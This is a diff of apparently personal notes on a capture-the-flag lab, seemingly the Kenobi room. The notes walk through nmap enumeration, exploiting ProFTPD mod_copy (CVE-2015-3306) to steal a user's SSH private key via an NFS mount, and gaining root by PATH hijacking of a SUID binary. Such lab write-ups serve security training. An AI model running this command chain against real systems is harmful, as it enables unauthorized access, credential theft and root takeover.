@@ -1,6 +1,6 @@
 <pre>
 Ran service discovery scan
-- nmap -Pn -A -sV -Sc -F 10.10.66.72
+- $ nmap -Pn -A -sV -Sc -F 10.10.66.72
 
 Scan Results:
 
@@ -72,7 +72,7 @@ Notable finds:
 Enumerating smb shares:
 
 Ran smb enumeration scan with nmap
- - nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.66.72
+ ~$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.66.72
 
 Scan Results:
 PORT    STATE SERVICE
@@ -108,9 +108,9 @@ Notable finds:
  - user anonymous
 
 connecting via smbclient:
- - smbclient //10.10.241.98/anonymous
+ ~$ smbclient //10.10.241.98/anonymous
  - found file log.txt, permission denied
- - downloaded log.txt onto host machine using smbget -R smb://10.10.241.98/anonymous
+ - downloaded log.txt onto host machine using ~$ smbget -R smb://10.10.241.98/anonymous 
  - log.txt was a proFTPD config file
  - port 21 is default port for proFTPD
 --------------------------------------------------------------------------------------------------
@@ -126,35 +126,35 @@ Additional Notes:
  --------------------------------------------------------------------------------------------------
 
 Enumerating file system on port 111 with nmap:
- - nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.241.98
+ ~$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.241.98
  - found mount /var
 --------------------------------------------------------------------------------------------------
 
 Exploiting cve-2015-3306:
 
 Mounting /var/ dir. to host machine
- - sudo mkdir /mnt/kenobiNFS
- - sudo mount 10.10.241.98:/var /mnt/kenobiNFS
+ ~$ sudo mkdir /mnt/kenobiNFS
+ ~$ sudo mount 10.10.241.98:/var /mnt/kenobiNFS
 
 Copying kenobi's Private key to mounted /var/ dir.
- - nc 10.10.241.98 21
- - SITE CPFR /home/kenobi/.ssh/id_rsa
- - SITE CPTO /var/tmp/id_rsa
+ ~$ nc 10.10.241.98 21
+ ~$ SITE CPFR /home/kenobi/.ssh/id_rsa
+ ~$ SITE CPTO /var/tmp/id_rsa
 --------------------------------------------------------------------------------------------------
 
 Gaining local Privilege Escalation:
 
 Copy private key from mount to host machine dir. in order to use for priv esc
- - cp /mnt/kenobiNFS/tmp/id_rsa
- - sudo chmod 600 id_rsa (connecting via ssh requires private key file to have strict permissions)
- - ssh -i id_rsa kenobi@10.10.241.98
+ ~$ cp /mnt/kenobiNFS/tmp/id_rsa
+ ~$ sudo chmod 600 id_rsa (connecting via ssh requires private key file to have strict permissions)
+ ~$ ssh -i id_rsa kenobi@10.10.241.98
 
 Gained local priv esc
 --------------------------------------------------------------------------------------------------
 
 Gaining Root via Path Manipulation:
 - searched for binary files with suid bit permission (execs file as owner)
-- find / -perm -u=s -type f 2>/dev/null
+~$ find / -perm -u=s -type f 2>/dev/null
 - found /usr/bin/menu it runs as root w/ no path
 
 Running the binary returns,
@@ -167,10 +167,10 @@ Running the binary returns,
 *********************
 
 Creating a shell to gain root
- - echo /bin/sh > curl (copies shell to curl)
- - chmod 777 curl
- - export PATH=/tmp:$PATH (Puts the shell in our /tmp path)
- - /usr/bin/menu
+ ~$ echo /bin/sh > curl (copies shell to curl)
+ ~$ chmod 777 curl
+ ~$ export PATH=/tmp:$PATH (Puts the shell in our /tmp path)
+ ~$ /usr/bin/menu
 
  When /usr/bin/menu is run it uses our path to find the 'curl' binary,
  because the menu binary runs as root so does our shell gaining root access.
